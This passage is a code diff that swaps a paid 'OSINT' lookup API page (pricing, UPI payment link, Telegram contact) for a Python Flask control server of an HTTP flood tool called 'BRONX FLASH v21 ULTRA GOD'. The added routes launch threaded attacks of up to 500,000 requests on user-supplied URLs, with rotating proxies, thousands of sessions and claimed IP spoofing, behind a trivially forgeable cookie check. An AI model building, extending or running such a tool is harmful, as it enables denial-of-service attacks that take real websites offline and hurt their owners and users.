-:root{--bg:#06060c;--sur:#0d0d1a;--brd:rgba(139,0,255,.15);--txt:#e0e0f0;--acc:#8b00ff;--acc2:#00c8ff;--green:#00ff88;--red:#ff0080;--yellow:#ffaa00;--pink:#ff0080}
-*{margin:0;padding:0;box-sizing:border-box}body{background:var(--bg);color:var(--txt);font-family:'Rajdhani',sans-serif;overflow-x:hidden;font-size:14px}
-::selection{background:var(--acc);color:#fff}::-webkit-scrollbar{width:3px}::-webkit-scrollbar-track{background:var(--bg)}::-webkit-scrollbar-thumb{background:var(--acc)}
-.snow{position:fixed;inset:0;pointer-events:none;z-index:0}.snowflake{position:absolute;width:3px;height:3px;background:#fff;border-radius:50%;animation:fall linear infinite;opacity:0}
-@keyframes fall{0%{transform:translateY(-10vh);opacity:0}10%{opacity:0.7}90%{opacity:0.7}100%{transform:translateY(110vh);opacity:0}}
-.tb{position:sticky;top:0;z-index:1000;background:rgba(13,13,26,.9);border-bottom:1px solid var(--brd);padding:8px 20px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:6px;backdrop-filter:blur(30px)}
-.tb .logo{font-family:'Orbitron',sans-serif;font-size:14px;letter-spacing:4px;background:linear-gradient(90deg,var(--acc),var(--acc2),var(--pink));-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:900}
-.tb .ba{background:rgba(0,255,136,.1);color:var(--green);padding:4px 12px;border-radius:20px;font-size:9px;font-weight:700;border:1px solid rgba(0,255,136,.2);animation:glow 2s infinite}
-@keyframes glow{0%,100%{box-shadow:0 0 6px rgba(0,255,136,.2)}50%{box-shadow:0 0 18px rgba(0,255,136,.4)}}
-.tb a{color:#666;text-decoration:none;font-size:10px;font-weight:600;letter-spacing:1px;transition:.3s}.tb a:hover{color:var(--acc2)}
-.hero{text-align:center;padding:40px 20px 15px;position:relative;z-index:1}
-.hero h1{font-size:56px;font-weight:900;background:linear-gradient(90deg,var(--acc),var(--acc2),var(--pink),var(--green));background-size:300% 100%;-webkit-background-clip:text;-webkit-text-fill-color:transparent;animation:rb 4s linear infinite;font-family:'Orbitron',sans-serif;margin-bottom:4px}
-@keyframes rb{0%{background-position:0% 50%}100%{background-position:300% 50%}}
-.hero .sub{font-size:12px;letter-spacing:4px;text-transform:uppercase;color:#666;margin-bottom:2px}
-.ct{max-width:1100px;margin:0 auto;padding:0 16px;position:relative;z-index:1}
-.st{display:flex;justify-content:center;gap:10px;flex-wrap:wrap;padding:14px;margin-bottom:18px;background:rgba(13,13,26,.9);border:1px solid var(--brd);border-radius:14px}
-.st>div{text-align:center;min-width:60px}.st .v{font-size:26px;font-weight:900;background:linear-gradient(135deg,var(--acc),var(--acc2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-family:'Orbitron',sans-serif}
-.st .l{font-size:7px;color:#555;text-transform:uppercase;letter-spacing:2px}
-.pay{background:rgba(13,13,26,.95);border:1px solid var(--brd);border-radius:16px;padding:18px;margin-bottom:18px}
-.pay h3{font-size:18px;font-weight:800;text-align:center;margin-bottom:12px;background:linear-gradient(135deg,var(--acc),var(--acc2));-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-family:'Orbitron',sans-serif}
-.pg{display:grid;grid-template-columns:repeat(auto-fit,minmax(90px,1fr));gap:6px;margin-bottom:12px}
-.pc{background:rgba(139,0,255,.03);border:1px solid rgba(139,0,255,.1);border-radius:8px;padding:8px;text-align:center;transition:.3s}
-.pc:hover{border-color:var(--acc);background:rgba(139,0,255,.06)}.pc .d{font-size:10px;color:#fff;font-weight:600}.pc .a{font-size:14px;color:var(--acc);font-weight:900}
-.pm{display:flex;flex-wrap:wrap;gap:5px;justify-content:center;margin-bottom:10px}
-.pb{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:6px;padding:6px 12px;color:#aaa;cursor:pointer;font-size:9px;font-weight:600;transition:.3s}
-.pb:hover{background:rgba(139,0,255,.1);border-color:var(--acc);color:var(--acc)}
-.upi{text-align:center;padding:12px;background:rgba(0,0,0,.3);border-radius:8px;margin-bottom:10px}
-.upi .pay-btn-glow{display:inline-block;background:linear-gradient(135deg,var(--acc),var(--acc2),var(--pink));background-size:300% 100%;animation:rb 3s linear infinite;color:#fff;padding:12px 30px;border-radius:25px;font-size:14px;font-weight:800;text-decoration:none;cursor:pointer;box-shadow:0 0 30px rgba(139,0,255,.3);transition:.3s;letter-spacing:1px;border:none;font-family:'Orbitron',sans-serif}
-.upi .pay-btn-glow:hover{transform:scale(1.05);box-shadow:0 0 50px rgba(139,0,255,.5)}
-.upi img{max-width:180px;border-radius:10px;margin:10px auto;display:block;border:2px solid rgba(139,0,255,.15)}
-.tgl{text-align:center;font-size:10px;color:#666;margin-top:8px}.tgl a{color:var(--acc2);text-decoration:none;font-weight:600}
-.pl{background:var(--sur);border:1px solid var(--brd);border-radius:12px;padding:16px;margin-bottom:18px}
-.pl h3{font-size:14px;font-weight:700;margin-bottom:10px;background:linear-gradient(135deg,var(--acc2),#fff);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
-.plf{display:flex;gap:8px;flex-wrap:wrap}.plf select,.plf input{flex:1;min-width:100px;padding:10px 12px;background:var(--bg);border:1px solid var(--brd);border-radius:7px;color:var(--txt);font-size:10px;font-family:monospace;outline:none}
-.plf select:focus,.plf input:focus{border-color:var(--acc)}.btx{padding:10px 18px;background:linear-gradient(135deg,var(--acc),var(--acc2));color:#fff;border:none;border-radius:7px;font-weight:700;font-size:10px;cursor:pointer;font-family:'Orbitron',sans-serif}
-.rb{margin-top:10px;background:#020210;border:1px solid var(--brd);border-radius:7px;padding:10px;max-height:250px;overflow:auto;font-family:monospace;font-size:8px;display:none;white-space:pre-wrap;color:var(--green)}
-.eg{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:8px;margin-bottom:18px}
-.ep{background:var(--sur);border:1px solid var(--brd);border-radius:10px;padding:14px;cursor:pointer;transition:.3s;border-top:3px solid var(--ac,#8b00ff)}
-.ep:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(0,0,0,.4)}.ep span{font-size:18px;display:block;margin-bottom:2px}
-.ep b{font-size:14px;color:#fff;display:block;margin-bottom:2px}.ep small{font-size:9px;color:#666;display:block;margin-bottom:6px}
-.ep code{font-family:monospace;font-size:8px;color:var(--ac,#8b00ff);background:rgba(0,0,0,.3);padding:3px 5px;border-radius:3px}
-.ft{text-align:center;padding:20px;border-top:1px solid var(--brd);position:relative;z-index:1}
-.ft .fb{font-size:16px;font-weight:900;background:linear-gradient(90deg,var(--acc),var(--acc2),var(--pink));-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-family:'Orbitron',sans-serif}
-.ft .fi{font-size:9px;color:#555;margin-top:2px}.ft .fi a{color:#666;text-decoration:none}
-@media(max-width:768px){.hero h1{font-size:30px}.eg{grid-template-columns:1fr}.plf{flex-direction:column}}
-</style></head><body><div class="snow" id="snow"></div><div class="tb"><a href="/" class="logo">⚡ BRONX V100</a><div style="display:flex;gap:10px;align-items:center"><a href="/docs">📚 DOCS</a><a href="/admin">🔐 ADMIN</a><span class="ba">✅ PAID API</span></div></div><header class="hero"><h1>BRONX OSINT V100</h1><p class="sub">ULTRA PRIME SUITE</p><p style="color:#555;font-size:10px;margin-top:4px">👑 King Always King 👑 · Unlimited · Real-Time · No Error</p></header><div class="ct"><div class="st"><div><div class="v">${totalEndpoints}</div><div class="l">ENDPOINTS</div></div><div><div class="v">${totalKeys}</div><div class="l">KEYS</div></div><div><div class="v">∞</div><div class="l">REQUESTS</div></div><div><div class="v">100%</div><div class="l">WORKING</div></div></div><div class="pay"><h3>💎 GET PAID API KEY</h3><div class="pg"><div class="pc"><div class="d">10 Days</div><div class="a">₹100</div></div><div class="pc"><div class="d">20 Days</div><div class="a">₹200</div></div><div class="pc"><div class="d">30 Days</div><div class="a">₹300</div></div><div class="pc"><div class="d">40 Days</div><div class="a">₹400</div></div><div class="pc"><div class="d">50 Days</div><div class="a">₹500</div></div><div class="pc"><div class="d">60 Days</div><div class="a">₹600</div></div><div class="pc" style="grid-column:1/-1;border-color:rgba(204,93,232,.2)"><div class="d">👑 LIFETIME</div><div class="a" style="color:#cc5de8">₹3000</div></div></div><div class="pm"><span class="pb">📱 UPI</span><span class="pb">💳 PhonePe</span><span class="pb">🏦 Navi</span><span class="pb">💰 Paytm</span></div><div class="upi"><a href="upi://pay?pa=8509561376@ibl&pn=BRONX_ULTRA&cu=INR" class="pay-btn-glow">⚡ CLICK TO PAY NOW ⚡</a><img src="https://i.ibb.co/sJwBtnWd/IMG-20260413-080502-825.jpg" alt="QR" onerror="this.style.display='none'"></div><p class="tgl">After Payment → <a href="https://t.me/BRONX_ULTRA">@BRONX_ULTRA</a></p></div><div class="pl"><h3>🧪 API PLAYGROUND</h3><div class="plf"><select id="es"><option value="">Select Endpoint</option>${opts}</select><input id="ak" placeholder="API Key..."><input id="pv" placeholder="Parameter..."><button class="btx" onclick="ta()">⚡ RUN</button></div><div class="rb" id="rb"></div></div><div class="eg">${cardsHTML}</div></div><footer class="ft"><p class="fb">BRONX OSINT V100 👑</p><p class="fi">@BRONX_ULTRA · <a href="/admin">Admin</a> · <a href="/docs">API Docs</a> · <a href="/test">Status</a></p></footer><script>
-var eps=${epsJSON};
-function toast(m){var t=document.createElement('div');t.style.cssText='position:fixed;bottom:16px;right:16px;background:#0d0d1a;color:#00c8ff;padding:8px 14px;border-radius:8px;font-size:10px;z-index:9999;border:1px solid rgba(139,0,255,.2)';t.textContent=m;document.body.appendChild(t);setTimeout(function(){t.remove()},2000)}
-function cp(n,p,e){navigator.clipboard.writeText(location.origin+'/api/key-bronx/'+n+'?key=KEY&'+p+'='+e).then(function(){toast('📋 Copied!')})}
-function ccp(n,p,e){navigator.clipboard.writeText(location.origin+'/api/custom/'+n+'?key=KEY&'+p+'='+e).then(function(){toast('📋 Copied!')})}
-async function ta(){var s=document.getElementById('es'),o=s.options[s.selectedIndex],k=document.getElementById('ak').value,v=document.getElementById('pv').value,rb=document.getElementById('rb');if(!s.value||!k||!v){toast('⚠ Fill all fields');return}var url=o.dataset.c==='1'?'/api/custom/'+o.dataset.ep+'?key='+k+'&'+o.dataset.p+'='+v:'/api/key-bronx/'+s.value+'?key='+k+'&'+eps[s.value].p+'='+v;rb.style.display='block';rb.style.color='#00ff88';rb.textContent='⏳ Loading...';try{var r=await fetch(url);var d=await r.json();rb.textContent=JSON.stringify(d,null,2);if(d.error)rb.style.color='#ff0080'}catch(e){rb.textContent='Error: '+e.message;rb.style.color='#ff0080'}}
-for(var i=0;i<30;i++){var sf=document.createElement('div');sf.className='snowflake';sf.style.left=Math.random()*100+'%';sf.style.animationDelay=Math.random()*10+'s';sf.style.animationDuration=(5+Math.random()*10)+'s';sf.style.width=sf.style.height=(2+Math.random()*3)+'px';document.getElementById('snow').appendChild(sf)}
-</script></body></html>`}catch(e){return '<html><body><h1>Error</h1></body></html>'}}
+@app.route('/current_effect')
+def get_current_effect():
+    return jsonify({"effect": current_effect})
 
-(async function(){const loaded=await loadFromStorage();if(!loaded){initDefaultData();initCustomAPIs()}if(!keyStorage[MASTER_API_KEY])keyStorage[MASTER_API_KEY]=createMasterKey();delete keyStorage['BRONX_ULTRA_MASTER_2026'];scheduleSave();console.log('✅ BRONX OSINT V100 ULTRA PRIME Ready! Keys:',Object.keys(keyStorage).length)})();
+@app.route('/attack', methods=['POST'])
+def attack():
+    if request.cookies.get('auth') != 'true': return jsonify({"error":"Unauthorized"}),403
+    d = request.get_json()
+    urls = [u.strip() for u in d.get('urls',[]) if u.strip()]
+    count = min(int(d.get('count',1000)), 500000)
+    speed = d.get('speed','ultragod')
+    mode = d.get('mode','mixed')
+    use_proxy = d.get('proxy',False)
+    if not urls: return jsonify({"error":"URLs required"}),400
+    
+    aid = f"atk_{int(time.time())}"
+    active_attacks[aid] = True
+    attack_logs.append(f"🎯 {len(urls)} targets | {count} req | {speed.upper()} | Multi-IP")
+    attack_logs.append(f"🔗 {multi_session_config['sessions_per_url']} sessions/URL | 10000 spoofed IPs")
+    
+    t = threading.Thread(target=run_ultra_attack, args=(aid,urls,count,speed,mode))
+    t.daemon=True; t.start()
+    return jsonify({"status":"started","attack_id":aid,"speed":speed})
 
-module.exports = app;
+@app.route('/stop', methods=['POST'])
+def stop():
+    count = len(active_attacks)
+    for k in list(active_attacks.keys()): del active_attacks[k]
+    attack_logs.append(f"⏹️ {count} attacks terminated")
+    return jsonify({"status":"stopped","count":count})
+
+@app.route('/reset', methods=['POST'])
+def reset():
+    with stats_lock:
+        attack_stats["success"] = 0
+        attack_stats["failed"] = 0
+        attack_stats["total"] = 0
+    return jsonify({"status":"reset"})
+
+@app.route('/reset_lifetime', methods=['POST'])
+def reset_lifetime():
+    with stats_lock:
+        total_lifetime["success"] = 0
+        total_lifetime["failed"] = 0
+        total_lifetime["total"] = 0
+    return jsonify({"status":"lifetime reset"})
+
+@app.route('/rate', methods=['POST'])
+def save_rate():
+    global rate_limit_config
+    d = request.get_json()
+    rate_limit_config = {"enabled": d.get('enabled',False), "rpm": d.get('rpm',15)}
+    return jsonify({"status":"saved"})
+
+@app.route('/save_proxies', methods=['POST'])
+def save_proxies():
+    global custom_proxies
+    d = request.get_json()
+    custom_proxies = [p.strip() for p in d.get('proxies','').split('\n') if p.strip() and ':' in p]
+    return jsonify({"status":"saved","count":len(custom_proxies)})
+
+@app.route('/multi_session', methods=['POST'])
+def save_multi_session():
+    global multi_session_config
+    d = request.get_json()
+    multi_session_config = {
+        "enabled": d.get('enabled',True),
+        "sessions_per_url": min(d.get('sessions_per_url',100), 3000),
+        "rotating": d.get('rotating',True)
+    }
+    attack_logs.append(f"🔗 Multi-Session: {multi_session_config['sessions_per_url']}/URL")
+    return jsonify({"status":"saved"})
+
+@app.route('/refresh_sessions', methods=['POST'])
+def refresh_sessions():
+    global session_pool
+    with session_lock:
+        new_count = min(500, len(session_pool))
+        session_pool = session_pool[new_count:] + [create_ultra_session() for _ in range(new_count)]
+    return jsonify({"status":"refreshed","pool_size":len(session_pool)})
+
+@app.route('/pool_status')
+def pool_status():
+    return jsonify({"pool_size": len(session_pool), "active_attacks": len(active_attacks)})
+
+@app.route('/ping')
+def ping():
+    return jsonify({"status":"pong","time":datetime.now().isoformat()})
+
+@app.route('/logs')
+def logs():
+    return jsonify({"logs":[f"[{datetime.now().strftime('%H:%M:%S')}] {l}" for l in attack_logs[-50:]]})
+
+@app.route('/stats')
+def stats():
+    with stats_lock:
+        return jsonify({
+            **attack_stats,
+            "lt_success": total_lifetime["success"],
+            "lt_total": total_lifetime["total"],
+            "active_attacks": len(active_attacks),
+            "pool_size": len(session_pool)
+        })
+
+@app.route('/logout')
+def logout():
+    return '<script>document.cookie="auth=false;path=/";location.href="/"</script>'
+
+# ============================================
+# STARTUP
+# ============================================
+if __name__ == "__main__":
+    print("""
+    ╔══════════════════════════════════════════╗
+    ║   💀 BRONX FLASH v21 ULTRA GOD 💀       ║
+    ║   ⚡ 5000 RPS • 3000 Sessions ⚡         ║
+    ║   🛡️ MULTI-IP • 10000 Spoofed IPs 🛡️   ║
+    ╚══════════════════════════════════════════╝
+    """)
+    initialize_session_pool()
+    print(f"⚡ Session Pool: {len(session_pool)} sessions ready")
+    print(f"🛡️ IP Pool: {len(IP_POOL)} spoofed IPs ready")
+    print(f"🎯 Default Speed: ULTRA GOD (5000 RPS)")
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port, threaded=True)
